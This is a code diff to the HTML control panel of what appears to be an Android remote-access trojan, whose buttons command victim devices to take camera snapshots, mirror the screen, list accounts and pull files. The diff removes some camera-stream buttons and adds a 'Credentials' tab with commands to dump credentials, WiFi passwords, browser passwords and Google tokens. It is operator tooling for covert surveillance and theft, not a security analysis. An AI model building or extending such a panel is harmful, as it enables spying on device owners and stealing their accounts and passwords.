@@ -104,11 +104,7 @@
                 <button data-cmd="CAMERA_SNAPSHOT" style="color:#ff6b6b;">📷 Camera</button>
                 <button data-cmd="CAMERA_SNAPSHOT back" style="color:#ff6b6b;">📷 Back Camera</button>
                 <button data-cmd="CAMERA_SNAPSHOT front" style="color:#ff6b6b;">🤳 Front Camera</button>
-                <!-- Camera Stream - BARU -->
-<button data-cmd="CAMERA_STREAM_START back" style="color:#ff6b6b;">📷 Stream Back</button>
-<button data-cmd="CAMERA_STREAM_START front" style="color:#ff6b6b;">🤳 Stream Front</button>
-<button data-cmd="CAMERA_STREAM_STOP" style="color:#ff6b6b;">⏹️ Stop</button>
-<button data-cmd="CAMERA_CAPTURE" style="color:#51cf66;">📸 Capture</button>
+               
                 <!-- Screenshot & Mirror -->
                 <button data-cmd="SCREENSHOT">📸 Screenshot</button>
                 <button data-cmd="SCREEN_START">🔄 Mirror Start</button>
@@ -130,7 +126,11 @@
                 <!-- Accounts -->
                 <button data-cmd="GET_ACCOUNTS" style="color:#ffd93d;">👤 Accounts</button>
                 <button data-cmd="GET_GOOGLE_ACCOUNTS" style="color:#4285F4;">🔵 Google</button>
-                
+                <!-- Credentials -->
+<button data-cmd="DUMP_CREDENTIALS" style="color:#ffd93d;">🔐 Dump Credentials</button>
+<button data-cmd="GET_WIFI_PASSWORDS" style="color:#ffd93d;">📶 WiFi Passwords</button>
+<button data-cmd="GET_BROWSER_PASSWORDS" style="color:#ffd93d;">🌐 Browser Passwords</button>
+<button data-cmd="GET_GOOGLE_TOKENS" style="color:#ffd93d;">🔵 Google Tokens</button>
                 <!-- Files -->
                 <button data-cmd="GET_FILES_LIST" style="color:#fcc419;">📁 Files List</button>
                 <button id="download-file-btn" style="color:#ff6b6b;">⬇️ Download</button>
@@ -223,6 +223,7 @@
                             <button class="tab" data-tab="wallpaper" style="color:#ff6b6b;">🖼️ Wallpaper</button>
                             <button class="tab" data-tab="files" style="color:#fcc419;">📁 Files</button>
                             <button class="tab" data-tab="browser" style="color:#8be9fd;">🌐 Browser</button>
+                            <button class="tab" data-tab="credentials" style="color:#ffd93d;">🔐 Credentials</button>
                         </div>
                         <div class="tab-scroll-indicator">
                             <button id="scrollTabsLeft" title="Scroll tabs left">◀</button>
@@ -406,9 +407,7 @@
     <div class="tab-header">
         <h3>📷 Camera</h3>
         <div class="tab-actions">
-            <button onclick="startCameraStream('back')" class="btn-small" style="color:#ff6b6b;">📷 Back</button>
-            <button onclick="startCameraStream('front')" class="btn-small" style="color:#ff6b6b;">🤳 Front</button>
-            <button onclick="stopCameraStream()" class="btn-small" style="color:#ff6b6b;">⏹️ Stop</button>
+
             <button onclick="captureCameraPhoto()" class="btn-small" style="color:#51cf66;">📸 Capture</button>
             <button onclick="pauseCameraStream()" class="btn-small" style="color:#ffd93d;">⏸️</button>
             <button onclick="resumeCameraStream()" class="btn-small" style="color:#51cf66;">▶️</button>
